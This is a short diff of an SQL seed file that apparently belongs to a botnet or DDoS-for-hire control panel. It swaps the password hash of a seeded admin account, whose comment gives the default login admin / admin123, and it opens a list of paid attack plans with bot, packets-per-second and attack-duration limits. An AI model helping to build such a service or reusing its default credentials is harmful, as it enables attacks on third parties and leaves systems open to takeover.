@@ -168,7 +168,7 @@ CREATE TABLE mb_sessions (
 
 -- Admin: admin / admin123
 INSERT INTO users (username, email, password_hash, role) VALUES
-('admin', 'admin@c2.local', '$2b$12$LJ3m4ys3Lk0TSwHlvB5FYe9Q1Pq.XLpH6zNflF8kG7vMNx5Vr2cKm', 'admin');
+('admin', 'admin@c2.local', '$2b$12$iw2ihlUINYafpVjXjgdujOijqGp4B9fPq7A5c97PPHr6jEx5N8C4G', 'admin');
 
 -- Plans
 INSERT INTO plans (name, slug, description, max_bots, max_concurrent, max_attack_secs, cooldown_secs, max_pps_per_bot, allowed_methods, price_vnd, price_usd) VALUES
